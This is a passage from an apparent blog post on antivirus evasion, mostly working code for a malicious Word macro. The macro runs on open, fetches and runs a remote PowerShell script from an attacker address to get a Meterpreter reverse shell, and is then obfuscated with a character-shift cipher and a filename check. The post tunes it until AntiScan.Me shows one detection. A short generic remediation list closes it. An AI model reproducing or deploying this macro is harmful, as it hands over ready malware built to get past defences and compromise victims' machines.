<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span>Sub MyMacro
  strArg = "powershell -exec bypass -nop -c iex((new-object
  system.net.webclient).downloadstring('http://10.11.0.100/run.txt'))"
  GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub

Sub AutoOpen()
  Mymacro
End Sub</span></span></code></div><br/>
Let's scan the updated document with AntiScan.Me:<br/><br/>
<img src="avtestres2.png" height="70%" width="70%" alt="avtestres2.png"><br/><br/>
Let's reap the benefits of avoiding the Shell method and perform<br/>
obfuscation of our VBA macro to further reduce the detection rate.<br/>
<h4>Obfuscating VBA</h4>
Encryption routine in PowerShell:<br/>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span>$payload = "powershell -exec bypass -nop -w hidden -c iex((new-object
system.net.webclient).downloadstring('http://10.11.0.100/run.txt'))"
[string]$output = ""
$payload.ToCharArray() | %{
  [string]$thischar = [byte][char]$_ + 17
  if($thischar.Length -eq 1)
  {
    $thischar = [string]"00" + $thischar
    $output += $thischar
  }
  elseif($thischar.Length -eq 2)
  {
    $thischar = [string]"0" + $thischar
    $output += $thischar
  }
  elseif($thischar.Length -eq 3)
  {
    $output += $thischar
  }
}
$output | clip</span></span></code></div><br/>
Running the PowerShell script produces the following output on the clipboard:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span>1291281361181311321211181251250490621181371181160491151381291141321320
4906212712812904906213604912112211711711812704906211604912211813705705
7127118136062128115123118116133049132138132133118126063127118133063136
1181151161251221181271330580631171281361271251281141171321331311221271
2005705612113313312907506406406607406706306607107306306606607406306606
7065064115128128124063133137133056058058
</span></span></code></div><br/>
Decryption routine using food product names, decrypting and executing the PowerShell download cradle:<br/>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span>Function Pears(Beets)
  Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
  Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
  Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
  Do
  Oatmilk = Oatmilk + Pears(Strawberries(Milk))
  Milk = Almonds(Milk)
  Loop While Len(Milk) > 0
  Nuts = Oatmilk
End Function


Function MyMacro()
  Dim Apples As String
  Dim Water As String
  Apples =
  "1291281361181311321211181251250490621181371181160491151381291141321320490621271281290
  49062136049121122117117118127049062116049122118137057057127118136062128115123118116133
  04913213813213311812606312711813306313611811511612512211812713305806311712813612712512
  81141171321331311221271200570561211331331290750640640660740670630660710730630660660740
  63066067065064115128128124063133137133056058058"
  Water = Nuts(Apples)
GetObject(Nuts("136122127126120126133132075")).Get(Nuts("10412212706806711209713112811
6118132132")).Create Water, Tea, Coffee, Napkin
End Function</span></span></code></div><br/>
Once we execute the encrypted VBA macro, we obtain a Meterpreter reverse shell, proving that<br/>
the rather convoluted technique actually works.<br/>
We test the document against AntiScan.Me and discover that only two products flag our code:<br/><br/>
<img src="avtestres3.png" height="70%" width="70%" alt="avtestres3.png"><br/><br/>
This custom encryption routine reduced our detection rate, but we can push it even further.<br/>
Although we have fully encrypted the VBA code, we are likely running into heuristics detection.<br/>
There are a number of ways to bypass heuristics in VBA that do not involve the use of Win32 APIs.<br/>
One simple technique is to check the document name when the macro runs.<br/><br/>
Verifying the name of the document:<br/>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span>If ActiveDocument.Name &lt;&gt; Nuts("131134127127118131063117128116") Then
  Exit Function
End If</span></span></code></div><br/>
The whole code is this:<br/>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span>Function Pears(Beets)
  Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
  Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
  Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
  Do
  Oatmilk = Oatmilk + Pears(Strawberries(Milk))
  Milk = Almonds(Milk)
  Loop While Len(Milk) > 0
  Nuts = Oatmilk
End Function


Function MyMacro()
  If ActiveDocument.Name &lt;&gt; Nuts("131134127127118131063117128116") Then
    Exit Function
  End If
  Dim Apples As String
  Dim Water As String
  Apples =
  "1291281361181311321211181251250490621181371181160491151381291141321320490621271281290
  49062136049121122117117118127049062116049122118137057057127118136062128115123118116133
  04913213813213311812606312711813306313611811511612512211812713305806311712813612712512
  81141171321331311221271200570561211331331290750640640660740670630660710730630660660740
  63066067065064115128128124063133137133056058058"
  Water = Nuts(Apples)
GetObject(Nuts("136122127126120126133132075")).Get(Nuts("10412212706806711209713112811
6118132132")).Create Water, Tea, Coffee, Napkin
End Function</span></span></code></div><br/>
As a result, AntiScan.Me reports that our code is only flagged by a single antivirus product!<br/><br/>
<img src="endoftheline.png" height="70%" width="70%" alt="endoftheline.png"><br/><br/>
<h3 id="Remedy">Remediation</h3>
Here's a list of actionable steps for defending against antivirus evasion:<br/>
<br/>
1. Keep Antivirus Software Updated:<br/>
<br/>
    Ensure your antivirus software is up to date with the latest virus definitions and security patches. Regular updates are crucial for identifying and blocking new threats.
    <br/><br/>
2. Employ Multi-Layered Security:<br/>
<br/>
    Implement a multi-layered security approach that includes firewalls, intrusion detection systems, and behavior-based analysis tools in addition to traditional antivirus software. This increases the chances of detecting and blocking malware.
    <br/><br/>
3. Use Endpoint Detection and Response (EDR) Solutions:<br/>
<br/>
    EDR solutions provide more advanced threat detection capabilities, including the ability to monitor and analyze endpoint activities for suspicious behavior. They can identify threats that may evade traditional signature-based antivirus solutions.
    <br/><br/>
4. Employ Machine Learning and AI:<br/>
<br/>
    Incorporate machine learning and artificial intelligence into your security stack. These technologies can help identify and respond to evolving threats and zero-day attacks more effectively.
    <br/><br/>
5. Harden System Security:<br/>
<br/>
    Implement best practices for system hardening, such as disabling unnecessary services, maintaining strong user access controls, and applying the principle of least privilege to limit what users and processes can do on the system.
    <br/><br/>
6. Regularly Patch and Update:<br/>
<br/>
    Keep all operating systems, applications, and software updated with the latest security patches. Vulnerabilities in these programs can be exploited by malware to evade antivirus detection.
    <br/><br/>
7. Educate and Train Users:<br/>
<br/>
    Train your employees or users to recognize and avoid social engineering attacks, phishing emails, and suspicious downloads. A well-informed workforce is a crucial line of defense against malware.
    <br/><br/>
8. Implement Email and Web Filtering:<br/>
<br/>
    Utilize email and web filtering solutions to block malicious attachments, links, and content at the network perimeter before they reach endpoints.
    <br/><br/>
9. Monitor Network Traffic:<br/>
<br/>
    Monitor network traffic for anomalies, unusual patterns, or known malicious signatures. Network monitoring can help detect and block malware before it reaches your systems.
    <br/><br/>
10. Implement Endpoint Isolation:<br/>
<br/>
    In the event of a suspected compromise, isolate affected endpoints from the network to prevent the lateral movement of malware and limit potential damage.
    <br/><br/>
11. Share Threat Intelligence:<br/>
<br/>
    Collaborate with industry peers and subscribe to threat intelligence feeds to stay informed about emerging threats and evasion techniques.
    <br/><br/>

12. Develop an Incident Response Plan:<br/>
<br/>
    Have a well-defined incident response plan in place to contain, eradicate, and recover from security incidents, including those involving malware evasion.
    <br/><br/>
13. Conduct Regular Security Audits and Penetration Testing:<br/>
    <br/>
        Last but definitely not least, perform periodic security audits and penetration testing to identify potential vulnerabilities and weaknesses in your infrastructure. Address any issues promptly.
        <br/><br/>
<h3 id="Conclusion">Conclusion</h3>
In conclusion, antivirus evasion is a critical concern in today's cybersecurity landscape. <br/> As threats continue to evolve, so too must our defenses.<br/>By understanding the techniques used by malware to evade detection, we can better protect our digital assets and data from the ever-present danger of cyberattacks.<br/>Stay informed, stay updated, and stay secure.<br/><br/>
More advanced antivirus evasion techniques coming soon...
<br/><br/><br/>
~Thank you for reading~
<h3 id="useful-references">Useful references</h3>
<ul>
<li><a href="https://www.cybrary.it/blog/advanced-exe-multi-protection-reverse-engineering-free-tools" target="_blank">Advanced EXE Multi Protection Against Reverse Engineering with Free Tools</a></li>
<li><a href="https://www.youtube.com/watch?v=xlfce2ITeNI" target="_blank">EvilClippy. How to bypass antiviruses?</a></li>
<li><a href="https://i.blackhat.com/asia-19/Thu-March-28/bh-asia-Hegt-MS-Office-in-Wonderland.pdf" target="_blank">MS Office in Wonderland slides. BlackHat Asia, March 2019 (pdf)</a></li>
<li><a href="https://www.youtube.com/watch?v=9pwMCHlNma4" target="_blank">AV Evasion - Mimikatz</a></li>
<li><a href="https://www.youtube.com/watch?v=C2cgvpN44is" target="_blank">Advanced Windows Logging - Finding What AV Missed</a></li>
<li><a href="https://www.youtube.com/watch?v=3eROsG_WNpE" target="_blank">All About DLL Hijacking</a></li>
<li><a href="https://www.offsec.com/blog/" target="_blank">OffSec Blog</a></li>
<li><a href="https://linux.die.net/man/" target="_blank">Linux Man Pages</a></li>
</ul>
	<div class="post-footer">
      
    </div>
  </article>

    </main>
  </body>
</html>
